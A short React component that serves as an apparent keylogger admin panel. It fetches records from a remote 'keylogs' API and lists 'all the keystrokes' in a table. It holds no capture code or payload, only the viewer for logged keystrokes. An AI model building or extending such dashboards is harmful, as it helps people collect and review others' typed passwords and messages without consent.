import React, { useEffect, useState } from 'react'
import Table from './Table'
import useFetch from '../useFetch';

const Admin = () => {
  const{ data, isPending, error} = useFetch('https://keylogging.pythonanywhere.com/api/keylogs');
  const[q, setQ] = useState('')
  return (
    <div>
        { error && <div> { error} </div> }
        { isPending && <div>Loading...</div> }
        {data && <Table data = {data} title = "All the keystrokes are listed below"/>}
    </div>
  )
}

export default Admin
